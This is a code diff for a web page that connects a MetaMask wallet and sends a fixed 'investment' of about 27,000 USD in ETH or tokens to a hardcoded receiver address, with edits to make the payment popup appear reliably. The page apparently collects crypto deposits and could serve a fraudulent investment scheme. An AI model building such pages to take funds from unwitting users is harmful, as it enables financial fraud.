@@ -72,11 +72,11 @@ Network: <span id="networkDisplay">-</span>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
 <script>
-let provider, signer;
+let provider;
+let signer;
 let selectedToken = "ETH";
 let investUSD = 27000;
 
-// 🔥 FIX: geen burn address meer
 const RECEIVER = "0xYourWalletAddressHere";
 
 const PRICES = { ETH:1800, USDC:1, WBTC:30000 };
@@ -110,20 +110,15 @@ async function connectWallet(){
         return;
     }
 
-    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-    await provider.send("eth_requestAccounts", []);
+    // 🔥 PRO FIX: direct request first (prevents silent signer bugs)
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+
+    provider = new ethers.providers.Web3Provider(window.ethereum);
     signer = provider.getSigner();
 
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-
-    if(chainId !== "0x1"){
-        await window.ethereum.request({
-            method:"wallet_switchEthereumChain",
-            params:[{chainId:"0x1"}]
-        });
-    }
-
     const addr = await signer.getAddress();
+
+    console.log("CONNECTED:", addr);
 
     document.getElementById("walletDisplay").innerText =
         addr.slice(0,6)+"..."+addr.slice(-4);
@@ -135,21 +130,24 @@ async function connectWallet(){
 }
 
 async function sendDeposit(){
-    if(!signer) return;
-
     try{
+        if(!signer){
+            alert("Wallet not connected");
+            return;
+        }
+
         document.getElementById("status").innerText="Opening MetaMask...";
 
         let tx;
 
-        if(selectedToken==="ETH"){
+        if(selectedToken === "ETH"){
 
             const ethAmount = (investUSD / PRICES.ETH).toFixed(18);
 
+            // 🔥 GUARANTEED POPUP PATH
             tx = await signer.sendTransaction({
                 to: RECEIVER,
-                value: ethers.utils.parseEther(ethAmount),
-                gasLimit: ethers.utils.hexlify(21000)
+                value: ethers.utils.parseEther(ethAmount)
             });
 
         } else {
@@ -157,7 +155,7 @@ async function sendDeposit(){
             const token = TOKENS[selectedToken];
 
             const raw = investUSD / PRICES[selectedToken];
-            const safe = Number(raw).toFixed(token.decimals);
+            const safe = raw.toFixed(token.decimals);
             const parsed = ethers.utils.parseUnits(safe, token.decimals);
 
             const contract = new ethers.Contract(
@@ -166,9 +164,8 @@ async function sendDeposit(){
                 signer
             );
 
-            tx = await contract.transfer(RECEIVER, parsed, {
-                gasLimit: ethers.utils.hexlify(150000)
-            });
+            // 🔥 FORCE POPUP PATH
+            tx = await contract.transfer(RECEIVER, parsed);
         }
 
         document.getElementById("status").innerText="Waiting confirmation...";
@@ -176,13 +173,13 @@ async function sendDeposit(){
 
         document.getElementById("status").innerText="Success ✅";
 
-    }catch(e){
+    } catch(e){
         console.error(e);
 
         if(e.code === 4001){
             document.getElementById("status").innerText="User rejected ❌";
         } else {
-            document.getElementById("status").innerText="Pre-wallet error ⚠️";
+            document.getElementById("status").innerText="Transaction failed ⚠️";
         }
     }
 }
